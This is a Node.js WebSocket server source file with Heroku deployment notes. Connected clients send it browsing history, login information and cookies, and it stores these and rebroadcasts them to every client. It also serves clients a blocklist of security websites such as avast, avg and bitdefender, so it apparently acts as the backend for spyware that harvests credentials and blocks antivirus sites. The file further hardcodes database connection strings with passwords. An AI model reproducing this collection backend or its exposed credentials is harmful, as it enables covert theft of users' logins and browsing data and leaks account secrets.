'use strict';
/*
URL = https://projectnickname123.herokuapp.com
If recieveing port in use error
type this in cmd
taskkill /F /IM node.exe

HELPFUL COMMANDS:
heroku local =hosts the server locally user, access using localhost:5000 
IMPORTANT: ALWAYSALWAYSALWAYSALWAYS test on locally before deploying onto heroku
heroku open = opens the url of deployed app
heroku logs --tail = shows logs of server

To push and deploy to heroku and github
git add .
git commit -m "commit message"
git push heroku master
git push origin master
*/

const express = require('express');
const SocketServer = require('ws').Server;
const path = require('path');
var bodyParser = require("body-parser");
var mysql = require('mysql');
var database = require('./SQLdatabase.js');
//var mongodb = require('mongodb');
//var MongoClient = mongodb.MongoClient;
//var uri = 'mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j';
//var mongoose = require ("mongoose");

const PORT = process.env.PORT || 5000;
const INDEX = path.join(__dirname, 'index.html');
const WebSocket = require('ws');

const server = express()
.use((req, res) => res.sendFile(INDEX) )
.listen(PORT, () => console.log(`Listening on ${ PORT }`));

//server.use((req, res) => res.sendFile(INDEX) );
//server.listen(PORT, () => console.log(`Listening on ${ PORT }`));
//server.use(bodyParser.json());

//var app = express();
const wss = new SocketServer({ server });

//server.post("/api/contacts", function(req, res) {
//    console.log(res);
//    var newContact = req.body;
//  });

mysql://b35b454793036b:91686762@us-cdbr-iron-east-01.cleardb.net/heroku_9059f11db120273?reconnect=true
mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j
var onlineClientsIDS = [];


wss.on('connection', function connection(ws) {//Upon a connection from a client
    //console.log(database.test("test string"));
    console.log('A Client connected');
    ws.on('message', function incoming(message) {//Upon a message from a client
        console.log('received json: \n', message);
        //ws.send(message);
        try{
        var data = JSON.parse(message);//turn message into JSON
        } catch(e){//if data isint proper format
            console.log('wrong format detected')
            return;
        }
        ws.id = data.id;//get client id
        var type = data.type;
        if (type=='Online'){
            if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
                console.log(ws.id+" connected");
                onlineClientsIDS.push(ws.id);
                database.setOnline(ws.id);//WORKS

                console.log(ws.id+" online status sent to server");
            }
            else
                console.log("ERROR!!!:id is already online");
        }

        else if (type == 'history'){//history list
            //var history = data.history;
            database.updateHistory(message);
        
        }

        //else if (type == 'cookie'){//cookie

        else if (type == 'info'){
            database.updateLoginInfo(message);

        }
        else if (type == 'getClients'){
            //var userStatus=database.getAllStatus();
            
            database.getAllStatus(function(userStatus){
                //console.log(userStatus);
                console.log("sending online client list");
                wss.broadcast(JSON.stringify(userStatus));
            });
            //console.log(userStatus);
            //var test = JSON.stringify(clientArr);
            //ws.send(JSON.stringify(database.getAllStatus()));
        }
        else if (type=='getList'){//get blacklsited sites
            
            //var siteArr = ["avast", "avg","bitdefender"];
            database.getSecurityWebsites(function(urlList){
                console.log(urlList);
                var arr=[];
                urlList.forEach(function each(url) {
                    arr.push(url.URL);
                });
                var jsonObj= {id:ws.id,type:'blackList',allSites:arr};
                wss.broadcast(JSON.stringify(jsonObj));
            });
        }
        else if (type=='cookie'){
            message.forEach();
        }
        //SENDING DATA
        wss.broadcast(message);
        /*
        wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        });
*/

    });


    ws.on('close', function (){ //when a client disconnects
        console.log(ws.id +' disconnected')
        var index = onlineClientsIDS.indexOf(ws.id);
        if (index > -1) {//remove id from active clients array
            onlineClientsIDS.splice(index, 1);
            //TODO SET ID IN ACTIVE USERS DATABASE TO OFFLINE
            database.setOffline(ws.id);
        }
        else
            console.log("ERROR!!!; id not in online id array");
    });
            
});

wss.broadcast = function broadcast(data) {
    console.log("Broatcasting "+data);
    wss.clients.forEach(function each(client) {
        client.send(data);
    });
    console.log("Broatcast complete");
  };